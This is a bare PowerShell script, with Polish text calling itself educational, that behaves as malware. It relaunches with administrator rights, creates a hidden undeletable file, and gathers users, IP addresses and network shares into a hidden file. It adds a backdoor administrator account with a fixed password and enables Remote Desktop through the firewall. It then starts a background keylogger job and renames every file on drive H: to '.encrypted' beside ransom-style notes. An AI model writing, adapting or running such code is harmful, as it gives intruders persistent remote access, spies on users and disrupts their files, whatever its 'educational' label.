RequireAdmin() {
    $user = [Security.Principal.WindowsIdentity]::GetCurrent()
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (RequireAdmin)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
$filePath = "H:\!systemfile.sys"
fsutil file createnew $filePath 0 | Out-Null
attrib +s +h +r $filePath
icacls $filePath /deny "Everyone:(D,DC)" /inheritance:r | Out-Null

$infoPath = "H:\info.txt"
$computerInfo = @"
--- DANE SYSTEMOWE ---
Nazwa komputera: $env:COMPUTERNAME
Użytkownicy lokalni:
$((Get-LocalUser | Format-Table Name, Enabled, LastLogon -AutoSize | Out-String))
Adresy IP:
$((Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Format-Table IPAddress, InterfaceAlias -AutoSize | Out-String))
Drzewo sieciowe:
$((net view /all) -join "`n")
"@
Set-Content -Path $infoPath -Value $computerInfo

net user /add $env:USERNAME`_shadow P@ssw0rd123! /passwordchg:no /comment:"Konto edukacyjne" | Out-Null
net localgroup administrators $env:USERNAME`_shadow /add | Out-Null

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" | Out-Null

$keyloggerScript = {
    $logPath = "H:\keylog.txt"
    while ($true) {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Keys]::GetValues([System.Windows.Forms.Keys]) | ForEach-Object {
            if ([System.Windows.Forms.Control]::IsKeyLocked($_)) {
                "[SPECJALNY: $_]" | Add-Content -Path $logPath
            }
        }
        Start-Sleep -Seconds 30
    }
}
Start-Job -ScriptBlock $keyloggerScript -Name "KeyLoggerJob"

$demoFiles = Get-ChildItem "H:\" -File | Where-Object {$_.Extension -ne ".sys"}
$demoFiles | ForEach-Object {
    $newName = $_.Name + ".encrypted"
    Rename-Item -Path $_.FullName -NewName $newName
    Set-Content -Path ($_.DirectoryName + "\" + $newName + ".README") -Value "To jest symulacja zaszyfrowanego pliku. W celach edukacyjnych."
}

Set-ItemProperty -Path "H:\info.txt" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Set-ItemProperty -Path "H:\keylog.txt" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
